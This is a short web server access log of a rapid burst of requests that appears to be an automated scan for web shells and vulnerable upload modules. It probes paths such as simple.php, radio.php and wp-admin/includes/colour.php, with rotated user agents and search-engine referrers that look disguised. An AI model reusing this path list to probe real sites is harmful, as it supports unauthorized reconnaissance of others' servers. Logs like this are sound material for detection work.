64.252.112.9 - - [26/Dec/2025:05:54:12 +0000] "GET /simple.php HTTP/1.1" 200 1290 "https://www.bing.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36" "244.32.152.114, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:12 +0000] "GET /uploads/ HTTP/1.1" 404 9 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 10; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "240.34.86.80, 4.241.216.133"
64.252.113.82 - - [26/Dec/2025:05:54:12 +0000] "GET /modules/mod_simplefileuploadv1.3/elements/index.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "205.138.167.72, 4.241.216.133"
3.172.35.19 - - [26/Dec/2025:05:54:12 +0000] "GET /new.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36" "93.117.249.241, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:13 +0000] "GET /public/files/index.php HTTP/1.1" 200 1290 "https://www.yahoo.com/" "Mozilla/5.0 (Linux; Android 11; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "70.98.36.239, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:13 +0000] "GET /public/wp-content/index.php HTTP/1.1" 200 1290 "https://www.google.co.uk/" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/118.0 Mobile/15E148 Safari/605.1.15" "10.144.175.2, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:13 +0000] "GET /radio.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1" "56.113.99.203, 4.241.216.133"
64.252.112.9 - - [26/Dec/2025:05:54:13 +0000] "GET /wp-admin/classwithtostring.php HTTP/1.1" 200 1290 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 11; CPH2251) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36" "156.113.90.61, 4.241.216.133"
64.252.113.161 - - [26/Dec/2025:05:54:13 +0000] "GET /wp-admin/includes/colour.php HTTP/1.1" 200 1290 "https://www.google.de/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1" "245.191.172.17, 4.241.216.133"
